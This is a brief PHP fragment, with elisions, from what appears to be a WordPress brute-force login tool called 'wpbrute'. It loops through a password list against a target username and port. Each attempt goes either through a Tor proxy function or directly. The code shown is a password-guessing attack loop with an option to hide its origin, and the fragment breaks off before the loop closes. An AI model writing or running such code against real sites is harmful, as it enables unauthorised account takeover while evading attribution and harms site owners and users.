...
while (1) {
	...
	for($wpbrute['passlist_progress']=0;$wpbrute['passlist_progress']<$wpbrute['passlist_total'];$wpbrute['passlist_progress']++) {
		...
		if ($wpbrute['proxy'] == true) {
			//Run via proxy.
			$wpbresult = wpbrute_try_tor($wpbrute['target_username'],$wpbrute['passlist_array'][$wpbrute['passlist_progress']],$wpbrute['target_port']);
		} else {
			//Run locally,
			$wpbresult = wpbrute_try($wpbrute['target_username'],$wpbrute['passlist_array'][$wpbrute['passlist_progress']],$wpbrute['target_port']);
		}
